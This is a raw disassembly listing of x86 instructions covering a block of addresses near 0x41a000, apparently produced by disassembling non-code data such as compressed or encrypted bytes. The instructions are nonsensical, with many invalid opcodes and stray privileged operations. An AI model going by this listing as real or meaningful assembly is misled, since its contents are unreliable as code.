  41a115:	call   0xcc7e:0x875a3460
  41a11c:	or     DWORD PTR [ecx-0x4a],eax
  41a11f:	loop   0x41a140
  41a121:	stos   BYTE PTR es:[edi],al
  41a122:	je     0x41a120
  41a124:	pusha  
  41a125:	mov    edx,0xcb485936
  41a12a:	dec    ebx
  41a12b:	addr16 or esi,ecx
  41a12e:	rcl    BYTE PTR [ecx-0xa],1
  41a131:	xor    DWORD PTR [edx-0x23b9ae94],ecx
  41a137:	pop    ebp
  41a138:	mov    ah,0xf3
  41a13a:	das    
  41a13b:	mov    ecx,0xdaaf432a
  41a140:	cmp    esp,eax
  41a142:	inc    ecx
  41a143:	ror    edx,1
  41a145:	jmp    0x5b28:0x432bce3a
  41a14c:	adc    ebx,edx
  41a14e:	sub    al,0xed
  41a150:	hlt    
  41a151:	pop    ebp
  41a152:	xlat   BYTE PTR ds:[ebx]
  41a153:	sti    
  41a154:	jp     0x41a0f0
  41a156:	push   esi
  41a157:	cdq    
  41a158:	mov    al,0x1f
  41a15a:	mov    dl,0x38
  41a15c:	mov    cl,BYTE PTR [esp+edi*4+0x4f58efcb]
  41a163:	les    esp,FWORD PTR [edx]
  41a165:	xor    BYTE PTR [edi],0xf5
  41a168:	push   es
  41a169:	out    0xc8,al
  41a16b:	cwde   
  41a16c:	pop    ss
  41a16d:	push   ecx
  41a16e:	or     al,0x4b
  41a170:	lods   al,BYTE PTR ds:[esi]
  41a171:	sbb    al,0xc7
  41a173:	adc    al,0xfa
  41a175:	or     ecx,ebx
  41a177:	adc    al,0x8d
  41a179:	mov    edi,0x7d035474
  41a17e:	imul   ebp,DWORD PTR [edi-0x67],0x81fab525
  41a185:	adc    BYTE PTR [edi-0x6d8edde0],al
  41a18b:	out    dx,al
  41a18c:	pop    esi
  41a18d:	ret    
  41a18e:	xlat   BYTE PTR ds:[ebx]
  41a18f:	add    BYTE PTR [eax],0x0
	...
  41a1f2:	add    BYTE PTR [eax],al
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	jae    0x41a1f7
  41a202:	sti    
  41a203:	fsub   st,st(4)
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	jnp    0x41a1e9
  41a20e:	ss inc esp
  41a210:	pop    esi
  41a211:	mov    al,bh
  41a213:	mov    eax,0x446d507c
  41a218:	aam    0x1f
  41a21a:	push   es
  41a21b:	hlt    
  41a21c:	mov    ah,0xd8
  41a21e:	das    
  41a21f:	inc    esp
  41a220:	shl    edi,cl
  41a222:	das    
  41a223:	(bad)  
  41a224:	mov    eax,0x4c1c47e9
  41a229:	mov    dh,0xff
  41a22b:	pop    ebp
  41a22c:	test   BYTE PTR [ecx],bl
  41a22e:	jl     0x41a28e
  41a230:	addr16 mov dl,0x66
  41a233:	(bad)  
  41a234:	retf   
  41a235:	add    eax,DWORD PTR [esi]
  41a237:	les    ebp,FWORD PTR [edi]
  41a239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a23a:	sub    bl,cl
  41a23c:	mov    cl,0x37
  41a23e:	lea    edi,[edi+0x3f]
  41a241:	jne    0x41a231
  41a243:	sub    DWORD PTR [edx],esp
  41a245:	fadd   DWORD PTR [eax]
  41a247:	(bad)  
  41a249:	faddp  st(4),st
  41a24b:	pop    edi
  41a24c:	push   eax
  41a24d:	sub    al,0x93
  41a24f:	add    ebp,DWORD PTR [edi]
  41a251:	mov    cl,BYTE PTR [ecx+ebx*2+0x19]
  41a255:	bound  ecx,QWORD PTR ds:0x847c6806
  41a25b:	lock test eax,0x1616a23
  41a261:	xor    BYTE PTR [ecx+esi*1-0x5e],0x46
  41a266:	dec    esi
  41a267:	imul   esi,ebx,0xc407dfcc
  41a26d:	fcom   DWORD PTR [ecx+0x6bdbd128]
  41a273:	pusha  
  41a274:	mov    dl,0x79
  41a276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a277:	push   0xffffffd3
  41a279:	add    ebp,DWORD PTR ds:0x8f63af26
  41a280:	push   ebx
  41a281:	and    DWORD PTR [ecx+0x7],edx
  41a284:	and    ah,BYTE PTR [ebp-0xa80b92a]
  41a28a:	mov    edi,0xad5fef36
  41a28f:	xchg   ebp,eax
  41a290:	aam    0xbf
  41a292:	sub    bl,BYTE PTR [esi+0x521614c8]
  41a298:	mov    es,WORD PTR [ebx]
  41a29a:	inc    ecx
  41a29b:	mov    ecx,0xd67a9241
  41a2a0:	arpl   WORD PTR [ebx-0x28],sp
  41a2a3:	and    al,0x71
  41a2a5:	jmp    0x41a238
  41a2a7:	xor    al,0x94
  41a2a9:	xchg   esp,ecx
  41a2ab:	xor    edi,DWORD PTR [ecx]
  41a2ad:	outs   dx,BYTE PTR ds:[esi]
  41a2ae:	call   0xc939:0xb6cc6bde
  41a2b5:	pop    esp
  41a2b6:	int3   
  41a2b7:	ret    0x90c4
  41a2ba:	shl    BYTE PTR [ebx*8+0x7511e90e],0x50
  41a2c2:	push   esp
  41a2c3:	outs   dx,DWORD PTR ds:[esi]
  41a2c4:	test   al,0x86
  41a2c6:	out    dx,eax
  41a2c7:	sar    BYTE PTR [edx],cl
  41a2c9:	outs   dx,DWORD PTR ds:[esi]
  41a2ca:	dec    ebx
  41a2cb:	ror    bh,cl
  41a2cd:	loope  0x41a2a7
  41a2cf:	cdq    
  41a2d0:	push   edx
  41a2d1:	pop    ebx
  41a2d2:	cdq    
  41a2d3:	gs scas al,BYTE PTR es:[edi]
  41a2d5:	push   ebx
  41a2d6:	jbe    0x41a283
  41a2d8:	dec    ebx
  41a2d9:	or     eax,DWORD PTR [ebx+0x70]
  41a2dc:	add    esi,DWORD PTR [eax+0x2d]
  41a2df:	dec    edx
  41a2e0:	sub    BYTE PTR es:[ebp-0x75ee2301],ch
  41a2e7:	adc    BYTE PTR [ecx+0x23],bh
  41a2ea:	inc    edi
  41a2eb:	loopne 0x41a294
  41a2ed:	ja     0x41a2e3
  41a2ef:	inc    ebx
  41a2f0:	aam    0x6
  41a2f2:	jno    0x41a2a6
  41a2f4:	jb     0x41a32e
  41a2f6:	test   BYTE PTR [esp+ebp*2+0x215f5711],bl
  41a2fd:	jl     0x41a28c
  41a2ff:	test   DWORD PTR [edi],0xd9721a1b
  41a305:	sahf   
  41a306:	xor    dl,dh
  41a308:	add    dl,ah
  41a30a:	test   eax,0x79df87db
  41a30f:	mov    esp,0x0
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	mov    al,ds:0xe8cf3229
  41a385:	adc    eax,0x1040001
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	in     eax,dx
  41a38d:	fisub  WORD PTR [ebx+edi*4-0x124e472b]
  41a394:	shl    DWORD PTR [ebp+0x4cc5797a],1
  41a39a:	sub    al,0xd6
  41a39c:	xchg   esp,eax
  41a39d:	mov    ebx,0x45698321
  41a3a2:	icebp  
  41a3a3:	xchg   ebx,eax
  41a3a4:	dec    esi
  41a3a5:	cmp    BYTE PTR [esi+0x74],dl
  41a3a8:	and    eax,0x126426ba
  41a3ad:	jmp    0xde1924b8
  41a3b2:	cmp    BYTE PTR [esi+0x63],al
  41a3b5:	mov    ebp,0x782fd2bf
  41a3ba:	shl    bl,1
  41a3bc:	aas    
  41a3bd:	inc    edi
  41a3be:	xor    DWORD PTR [edi+0x2838ae49],ebx
  41a3c4:	xchg   edi,eax
  41a3c5:	in     eax,0x30
  41a3c7:	das    
  41a3c8:	in     al,dx
  41a3c9:	mov    al,0x3e
  41a3cb:	xor    ebx,ebp
  41a3cd:	int    0xa2
  41a3cf:	mov    cl,dl
  41a3d1:	enter  0xddd8,0x5f
  41a3d5:	fnsave [edi+eax*8-0x455b2c58]
  41a3dc:	xchg   edi,eax
  41a3dd:	loopne 0x41a3a2
  41a3df:	out    0x1b,eax
  41a3e1:	adc    BYTE PTR [esi],bh
  41a3e3:	addr16 jns 0x41a44c
  41a3e6:	xlat   BYTE PTR ds:[ebx]
  41a3e7:	cmp    BYTE PTR [edx-0x1f],ah
  41a3ea:	iret   
  41a3eb:	jno    0x41a394
  41a3ed:	into   
  41a3ee:	mov    edi,0xb21c7ad
  41a3f3:	cmp    al,0x35
  41a3f5:	outs   dx,BYTE PTR ds:[esi]
  41a3f6:	mov    dh,0x9b
  41a3f8:	ret    
  41a3f9:	enter  0x8aa5,0xae
  41a3fd:	(bad)  
  41a3fe:	jbe    0x41a442
  41a400:	mov    eax,ds:0x4051ff02
  41a405:	push   edx
  41a406:	xor    DWORD PTR [ecx],ebx
  41a408:	push   es
  41a409:	or     BYTE PTR [edx],ah
  41a40b:	mov    eax,0x5c0b1f34
  41a410:	push   esi
  41a411:	push   cs
  41a412:	add    DWORD PTR ss:[esi+eax*2],ebp
  41a416:	mov    esi,0x6047ff83
  41a41b:	(bad)  
  41a41c:	mov    edx,0x8bff98ac
  41a421:	add    DWORD PTR [ebp+0x77],edi
  41a424:	mov    edi,?
  41a426:	push   ecx
  41a427:	call   0x353cffc
  41a42c:	cmp    al,0x47
  41a42e:	sbb    al,0x68
  41a430:	jecxz  0x41a3d7
  41a432:	xchg   ebp,eax
  41a433:	pop    edx
  41a434:	xor    bl,BYTE PTR [eax+eiz*4-0x3e]
  41a438:	sbb    edi,DWORD PTR [eax]
  41a43a:	iret   
  41a43b:	add    BYTE PTR [edx],0xd2
  41a43e:	sub    BYTE PTR [edi+ebx*8-0x40],al
  41a442:	xchg   ecx,eax
  41a443:	(bad)  
  41a445:	xchg   esi,eax
  41a446:	ins    DWORD PTR es:[edi],dx
  41a447:	jo     0x41a402
  41a449:	and    ah,BYTE PTR [eax-0xb6d8af]
  41a44f:	mov    DWORD PTR [edi+0x3d],esp
  41a452:	shl    BYTE PTR [ebp+0x2e4cb726],0xdb
  41a459:	shl    BYTE PTR [edx-0x29],cl
  41a45c:	lock fld TBYTE PTR [eax]
  41a45f:	mov    ecx,0xd26aac58
  41a464:	imul   edx,DWORD PTR [ebx+0x625deece],0x2b
  41a46b:	cmp    al,0xb4
  41a46d:	rcl    cl,0xc3
  41a470:	jb     0x41a434
  41a472:	dec    ebx
  41a473:	jne    0x41a46b
  41a475:	jo     0x41a425
  41a477:	cmc    
  41a478:	adc    BYTE PTR [ebx],ah
  41a47a:	mul    BYTE PTR [edx]
  41a47c:	add    eax,0x9e25eb5
  41a481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a482:	inc    edi
  41a483:	push   edx
  41a484:	out    0xae,eax
  41a486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a487:	or     DWORD PTR [eax+0x21],esi
  41a48a:	rcr    BYTE PTR [esi+edi*2+0x611a73],cl
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	cmc    
  41a501:	xor    al,0xcd
  41a503:	(bad)  
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	popf   
  41a50d:	sub    cl,dl
  41a50f:	mov    ch,0xf1
  41a511:	test   DWORD PTR [edx],edi
  41a513:	ins    DWORD PTR es:[edi],dx
  41a514:	mov    ss,ecx
  41a516:	ror    DWORD PTR [eax],cl
  41a518:	shr    DWORD PTR [edi],0x78
  41a51b:	jle    0x41a4cf
  41a51d:	mov    esp,0x93bbed94
  41a522:	adc    eax,0x416c7f21
  41a527:	or     DWORD PTR [edx+0x18],0x39
  41a52b:	jae    0x41a4f0
  41a52d:	mov    WORD PTR [eax+0x32],fs
  41a530:	rol    esp,cl
  41a532:	dec    ebp
  41a533:	fcomp  DWORD PTR [ecx+ecx*1+0x66211d4d]
  41a53a:	dec    esi
  41a53b:	gs add al,cl
  41a53e:	mov    ds:0x33c3205e,al
  41a543:	mov    WORD PTR ds:[ecx-0x192950f6],dx
  41a54b:	adc    ah,BYTE PTR [bx]
  41a54e:	jnp    0x41a518
  41a550:	mov    ah,BYTE PTR [esi]
  41a552:	sahf   
  41a553:	push   esp
  41a554:	mov    ebx,0x73733d2f
  41a559:	leave  
  41a55a:	es pop ebp
  41a55c:	and    DWORD PTR [ebp+0x7e56c35a],eax
  41a562:	test   DWORD PTR [esi+0x6c4c1871],ebx
  41a568:	scas   al,BYTE PTR es:[edi]
  41a569:	or     eax,0xd033f5d4
  41a56e:	mov    eax,0xe59e468c
  41a573:	xchg   esi,eax
  41a574:	popf   
  41a575:	loope  0x41a4fc
  41a577:	lds    esi,FWORD PTR [edx+0x11b116ed]
  41a57d:	push   esp
  41a57e:	out    dx,al
  41a57f:	bound  ecx,QWORD PTR [esi]
  41a581:	hlt    
  41a582:	jmp    0xa004370e
  41a587:	call   0x5e8975b3
  41a58c:	pop    eax
  41a58d:	scas   eax,DWORD PTR es:[edi]
  41a58e:	push   ebx
  41a58f:	mov    al,ds:0x8e6d501d
  41a594:	sub    DWORD PTR [edx],ebx
  41a596:	out    dx,al
  41a597:	add    ebx,esi
  41a599:	mov    esp,0x8d4b3012
  41a59e:	push   ebp
  41a59f:	lods   eax,DWORD PTR ds:[esi]
  41a5a0:	xchg   ecx,eax
  41a5a1:	jp     0x41a599
  41a5a3:	fs fdivrp st(2),st
  41a5a6:	lock xchg ebx,eax
  41a5a8:	adc    edx,DWORD PTR ss:[eax]
  41a5ab:	push   ebp
  41a5ac:	shr    DWORD PTR [eax-0x469c785f],0xf9
  41a5b3:	push   eax
  41a5b4:	mov    dh,0x5d
  41a5b6:	lods   al,BYTE PTR ds:[esi]
  41a5b7:	xor    bl,BYTE PTR [ebp+0x7f]
  41a5ba:	lea    ebx,[edx-0x1c1382e3]
  41a5c0:	dec    edi
  41a5c1:	pushf  
  41a5c2:	loopne 0x41a5ba
  41a5c4:	xchg   BYTE PTR [edi-0xebbf877],bl
  41a5ca:	jle    0x41a557
  41a5cc:	aas    
  41a5cd:	int3   
  41a5ce:	xchg   edi,eax
  41a5cf:	xor    BYTE PTR [ebp+0x39],al
  41a5d2:	adc    DWORD PTR [eax+esi*2+0x3c],0x61
  41a5d7:	sub    DWORD PTR [edx+eax*8],esi
  41a5da:	jl     0x41a5d7
  41a5dc:	lea    ebp,[ebx]
  41a5de:	jb     0x41a594
  41a5e0:	les    esi,FWORD PTR [ebp+0x6]
  41a5e3:	jne    0x41a58a
  41a5e5:	sbb    eax,0xef58d012
  41a5eb:	lea    ebx,[eax+0x3f5482a3]
  41a5f1:	(bad)  
  41a5f2:	jns    0x41a60f
  41a5f4:	lds    ebx,FWORD PTR [esi-0x41]
  41a5f7:	popa   
  41a5f8:	inc    edx
  41a5f9:	into   
  41a5fa:	test   DWORD PTR [ebp+0x3d4442d2],eax
  41a600:	adc    esp,DWORD PTR [esi-0xb]
  41a603:	mul    BYTE PTR [esi+0x4b]
  41a606:	push   esp
  41a607:	ins    DWORD PTR es:[edi],dx
  41a608:	es ds enterw 0xc911,0x4
  41a60f:	nop
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xdde3a625
  41a682:	shl    DWORD PTR [ebp-0x10],cl
  41a685:	pop    ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	js     0x41a65e
  41a68e:	push   edx
  41a68f:	xchg   DWORD PTR [edi-0x5b1abadc],edi
  41a695:	inc    eax
  41a696:	sbb    esp,edx
  41a698:	fwait
  41a699:	inc    esp
  41a69a:	sub    DWORD PTR [eax],esp
  41a69c:	pusha  
  41a69d:	mov    dh,0xd8
  41a69f:	mov    esp,0x7fe93f0d
  41a6a4:	mov    edx,0x3c43e464
  41a6a9:	add    DWORD PTR [edi-0x74d39c5f],ecx
  41a6af:	jns    0x41a6f6
  41a6b1:	mov    dl,0xfa
  41a6b3:	jo     0x41a662
  41a6b5:	add    edx,ebx
  41a6b7:	hlt    
  41a6b8:	xchg   ebp,eax
  41a6b9:	xchg   esp,eax
  41a6ba:	jne    0x41a64c
  41a6bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6bd:	and    ebp,DWORD PTR [edx+0x28cdf150]
  41a6c3:	mov    dl,0x91
  41a6c5:	div    BYTE PTR [edx-0xc]
  41a6c8:	addr16 dec ebx
  41a6ca:	js     0x41a673
  41a6cc:	jp     0x41a6d6
  41a6ce:	sar    DWORD PTR [edx+0x72],cl
  41a6d1:	push   0xffffffa3
  41a6d3:	add    BYTE PTR [ebx],cl
  41a6d5:	lahf   
  41a6d6:	arpl   WORD PTR [ecx-0x3b09ad46],di
  41a6dc:	aad    0x3f
  41a6de:	(bad)  
  41a6e0:	in     eax,dx
  41a6e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6e2:	jae    0x41a75e
  41a6e4:	inc    esi
  41a6e5:	dec    edx
  41a6e6:	in     eax,0x40
  41a6e8:	cmc    
  41a6e9:	jne    0x41a741
  41a6eb:	xor    eax,0x1ffa9b32
  41a6f0:	dec    esi
  41a6f1:	aaa    
  41a6f2:	(bad)  [ebx]
  41a6f4:	jne    0x41a6db
  41a6f6:	xchg   ecx,eax
  41a6f7:	push   ss
  41a6f8:	dec    ebx
  41a6f9:	mov    cl,0xd9
  41a6fb:	mov    eax,0x33d5b07b
  41a700:	jo     0x41a6bb
  41a702:	push   0x1b
  41a704:	dec    ebx
  41a705:	cwde   
  41a706:	adc    eax,0x1bfdedc0
  41a70b:	loope  0x41a6c5
  41a70d:	add    edi,DWORD PTR [esi+0x16]
  41a710:	clc    
  41a711:	sbb    eax,0x88e7a6ba
  41a716:	cs out 0xfa,al
  41a719:	sti    
  41a71a:	push   0x1ff8a766
  41a71f:	dec    esp
  41a720:	js     0x41a721
  41a722:	stos   DWORD PTR es:[edi],eax
  41a723:	xchg   ebp,eax
  41a724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a725:	inc    esi
  41a726:	nop
  41a727:	dec    ebx
  41a728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a729:	push   0xdddc7f29
  41a72e:	mov    ah,0x51
  41a730:	lds    esi,FWORD PTR [ecx-0x195144ad]
  41a736:	or     eax,0x7418307d
  41a73b:	xchg   ecx,eax
  41a73c:	push   ds
  41a73d:	xlat   BYTE PTR ds:[ebx]
  41a73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a73f:	inc    eax
  41a740:	sub    DWORD PTR [eax-0x5fb37aa9],0x90e0566c
  41a74a:	and    ah,BYTE PTR [ecx-0x113a4d49]
  41a750:	cmp    ah,BYTE PTR [edi-0xaa7a1fe]
  41a756:	or     cl,BYTE PTR [eax-0x66af3783]
  41a75c:	xchg   edx,eax
  41a75d:	arpl   WORD PTR [ecx-0xa],si
  41a760:	jns    0x41a781
  41a762:	ins    BYTE PTR es:[edi],dx
  41a763:	inc    esi
  41a764:	pop    es
  41a765:	arpl   WORD PTR [esi],bp
  41a767:	data16 aaa 
  41a769:	(bad)  
  41a76a:	pop    ebx
  41a76b:	sbb    eax,0x2a3a5006
  41a770:	dec    edx
  41a771:	jb     0x41a723
  41a773:	pop    edx
  41a774:	shl    DWORD PTR [ecx],0x0
  41a777:	loop   0x41a7e4
  41a779:	adc    BYTE PTR [esi],cl
  41a77b:	pop    edi
  41a77c:	add    eax,eax
  41a77e:	xor    edx,ebx
  41a780:	jnp    0x41a7e9
  41a782:	or     ebp,DWORD PTR [ebp-0x4b792dfc]
  41a788:	lea    ecx,[ebx+0xf]
  41a78b:	enter  0x492a,0x9b
  41a78f:	iret   
	...
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xce5327ca,al
  41a801:	xor    BYTE PTR [ebp+ebx*1+0x118f4],al
  41a808:	add    al,0x1
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	ret    0x4ea6
  41a80f:	into   
  41a810:	cli    
  41a811:	sub    ch,ah
  41a813:	push   es
  41a814:	retf   0x92d1
  41a817:	cmp    ebx,eax
  41a819:	scas   al,BYTE PTR es:[edi]
  41a81a:	data16 aaa 
  41a81c:	pop    ecx
  41a81d:	out    dx,al
  41a81e:	cmp    DWORD PTR [ecx+0x74],edi
  41a821:	dec    esi
  41a822:	sub    BYTE PTR [eax-0x6],ch
  41a825:	in     al,dx
  41a826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a827:	test   BYTE PTR [edx],ch
  41a829:	jp     0x41a7db
  41a82b:	mov    al,ds:0xc196cf7d
  41a830:	cld    
  41a831:	out    0x8a,al
  41a833:	fwait
  41a834:	jge    0x41a7f3
  41a836:	and    ebx,DWORD PTR [ebp+0x3f]
  41a839:	mov    ch,BYTE PTR [esp+ebp*1]
  41a83c:	sbb    edi,ecx
  41a83e:	daa    
  41a83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a840:	lds    ecx,FWORD PTR [edi]
  41a842:	iret   
  41a843:	int    0x7d
  41a845:	cdq    
  41a846:	cli    
  41a847:	push   cs
  41a848:	bound  eax,QWORD PTR [ecx-0x3d]
  41a84b:	mov    ah,0x75
  41a84d:	aas    
  41a84e:	pop    ebp
  41a84f:	xor    eax,0x1d2590c4
  41a854:	pop    ebx
  41a855:	aad    0x9f
  41a857:	lds    edi,FWORD PTR [eax]
  41a859:	jne    0x41a7fd
  41a85b:	fs pop ds
  41a85d:	retf   
  41a85e:	imul   edi,DWORD PTR [ecx+0x1d],0x3b007e5d
  41a865:	add    bl,bl
  41a867:	mov    edi,0xc443bde9
  41a86c:	xlat   BYTE PTR ds:[ebx]
  41a86d:	sub    ebx,DWORD PTR [edx-0xffd5a57]
  41a873:	cdq    
  41a874:	je     0x41a86e
  41a876:	cli    
  41a877:	fnstcw WORD PTR [ebp+edi*2-0x2f]
  41a87b:	nop
  41a87c:	xlat   BYTE PTR ds:[ebx]
  41a87d:	jbe    0x41a827
  41a87f:	xor    esi,DWORD PTR [edx]
  41a881:	jnp    0x41a88f
  41a883:	out    dx,eax
  41a884:	nop
  41a885:	mov    bl,0xc4
  41a887:	push   0xffffffc5
  41a889:	test   eax,0x63254a56
  41a88e:	push   0x1a
  41a890:	dec    DWORD PTR [edi+0x7bcf0b16]
  41a896:	dec    esp
  41a897:	arpl   WORD PTR [ebp-0x5c425b7],ax
  41a89d:	cmp    ebp,DWORD PTR ds:0xf6a23b68
  41a8a3:	adc    BYTE PTR [eax+0x2e],ch
  41a8a6:	push   ebp
  41a8a7:	test   DWORD PTR [ecx+0x780cd9d6],ebx
  41a8ad:	xchg   DWORD PTR [esp+edi*2],edi
  41a8b0:	push   esp
  41a8b1:	jl     0x41a90d
  41a8b3:	inc    edx
  41a8b4:	pop    ecx
  41a8b5:	out    0xbb,eax
  41a8b7:	mov    eax,ds:0x6ca46fc
  41a8bc:	mov    al,ds:0x8e051f43
  41a8c1:	into   
  41a8c2:	adc    al,0x89
  41a8c4:	mov    eax,ds:0xddce9fe3
  41a8c9:	sub    ch,BYTE PTR [ebx-0x597cedc2]
  41a8cf:	and    BYTE PTR [ebx+eax*1+0x33],al
  41a8d3:	cmc    
  41a8d4:	es imul ebp,DWORD PTR ds:[ecx-0x43],0xffffffde
  41a8da:	xchg   DWORD PTR ds:0xfecdfb4b,esi
  41a8e0:	or     al,0xbc
  41a8e2:	in     al,0xd8
  41a8e4:	lea    ebp,[eax]
  41a8e6:	in     eax,dx
  41a8e7:	mov    bl,0xd8
  41a8e9:	test   edi,ecx
  41a8eb:	outs   dx,DWORD PTR ds:[esi]
  41a8ec:	xchg   ebp,eax
  41a8ed:	(bad)  
  41a8ee:	jnp    0x41a942
  41a8f0:	ins    DWORD PTR es:[edi],dx
  41a8f1:	push   ss
  41a8f2:	stc    
  41a8f3:	das    
  41a8f4:	xchg   edx,eax
  41a8f5:	and    DWORD PTR [ecx-0x3122d61d],0x53
  41a8fc:	(bad)  
  41a8fd:	mov    BYTE PTR [eax+0x39ceafc9],cl
  41a903:	pop    ebp
  41a904:	xchg   esi,eax
  41a905:	clc    
  41a906:	add    bl,BYTE PTR [ebp+0x2ce45bb]
  41a90c:	aaa    
  41a90d:	push   esp
  41a90e:	cmp    al,0x0
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	pop    ss
  41a981:	lds    ebx,FWORD PTR [edi+0x4e]
  41a984:	clc    
  41a985:	sbb    DWORD PTR [ecx],eax
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	(bad)
  41a98f:	xchg   esp,eax
  41a990:	scas   al,BYTE PTR es:[edi]
  41a991:	aad    0xd9
  41a993:	leave  
  41a994:	daa    
  41a995:	in     al,dx
  41a996:	dec    ecx
  41a997:	push   edx
  41a998:	lods   al,BYTE PTR ds:[esi]
  41a999:	popf   
  41a99a:	rcl    BYTE PTR [esi-0x53],1
  41a99d:	nop
  41a99e:	adc    BYTE PTR [ecx-0x216eb34f],bh
  41a9a4:	dec    ecx
  41a9a5:	lds    edi,FWORD PTR [edi]
  41a9a7:	adc    DWORD PTR [ecx+edx*4],eax
  41a9aa:	pop    esp
  41a9ab:	xchg   esi,eax
  41a9ac:	pop    ecx
  41a9ad:	or     ah,BYTE PTR [ebx+0x39e49d7b]
  41a9b3:	mov    cs,WORD PTR [ebx-0x23]
  41a9b6:	test   BYTE PTR [esi],0xcb
  41a9b9:	sahf   
  41a9ba:	mov    ds:0x526a5ba7,al
  41a9bf:	fidiv  DWORD PTR [ecx+0x50]
  41a9c2:	jmp    DWORD PTR [edi]
  41a9c4:	sbb    edx,DWORD PTR [ebp+0x7b9c7f9c]
  41a9ca:	mov    ch,0x4b
  41a9cc:	cmp    BYTE PTR [ecx+0x31],al
  41a9cf:	je     0x41a9e8
  41a9d1:	out    dx,al
  41a9d2:	mov    cl,0x2c
  41a9d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9d5:	xchg   edx,eax
  41a9d6:	jl     0x41aa55
  41a9d8:	adc    BYTE PTR [edi+0x7297f635],ch
  41a9de:	and    eax,0xccbfaf7e
  41a9e3:	add    dl,BYTE PTR [edx]
  41a9e5:	dec    esi
  41a9e6:	jne    0x41a9e1
  41a9e8:	mov    DWORD PTR ds:[edi+eax*4],esp
  41a9ec:	or     eax,0x695e5903
  41a9f1:	push   eax
  41a9f2:	not    DWORD PTR [edx]
  41a9f4:	push   esp
  41a9f5:	cs into 
  41a9f7:	dec    eax
  41a9f8:	call   DWORD PTR [ebp+0x9]
  41a9fb:	dec    esi
  41a9fc:	sbb    bl,BYTE PTR [eax]
  41a9fe:	push   edi
  41a9ff:	cmp    DWORD PTR [ecx-0x769dae40],esi
  41aa05:	push   ebx
  41aa06:	(bad)  
  41aa07:	mov    dl,0x43
  41aa09:	push   0x6bdc9b35
  41aa0e:	and    esi,DWORD PTR [esi+ebp*4]
  41aa11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa12:	xchg   DWORD PTR [edi+0x6779f40],edi
  41aa18:	idiv   DWORD PTR [esi-0x61bcf130]
  41aa1e:	pop    ss
  41aa1f:	nop
  41aa20:	outs   dx,BYTE PTR ds:[esi]
  41aa21:	in     al,0x23
  41aa23:	fucom  st(0)
  41aa25:	jp     0x41aa95
  41aa27:	outs   dx,DWORD PTR ds:[esi]
  41aa28:	add    ebp,ebp
  41aa2a:	sub    BYTE PTR [edi-0x478f3360],cl
  41aa30:	int3   
  41aa31:	dec    eax
  41aa32:	test   DWORD PTR [esi-0x4e640309],edx
  41aa38:	cs (bad) 
  41aa3a:	dec    ebp
  41aa3b:	fstp   TBYTE PTR [edi+0x78991c84]
  41aa41:	(bad)  
  41aa43:	jne    0x41a9c6
  41aa45:	sub    eax,0x416e49d1
  41aa4a:	sbb    al,0xa1
  41aa4c:	mov    ecx,0xb32dc08c
  41aa51:	push   ds
  41aa52:	sub    DWORD PTR [ebp+0x5b],ebx
  41aa55:	pop    eax
  41aa56:	fwait
  41aa57:	lock xchg ebx,eax
  41aa59:	cmp    eax,0xf2989791
  41aa5e:	mov    ds:0x1bd48289,al
  41aa63:	push   ds
  41aa64:	imul   ecx,DWORD PTR [edx+eax*4+0x3c966873],0x3d9b112
  41aa6f:	push   0x1914f7c7
  41aa74:	das    
  41aa75:	inc    ebx
  41aa76:	mov    dl,0x71
  41aa78:	dec    ecx
  41aa79:	dec    esi
  41aa7a:	dec    esp
  41aa7b:	or     BYTE PTR [eax+0x21],dl
  41aa7e:	push   esp
  41aa7f:	push   cs
  41aa80:	lahf   
  41aa81:	or     cl,BYTE PTR [eax-0x7694d80a]
  41aa87:	pop    ds
  41aa88:	mov    ebp,ebx
  41aa8a:	sbb    DWORD PTR [eax+0x7b],ebx
  41aa8d:	jns    0x41aa22
  41aa8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
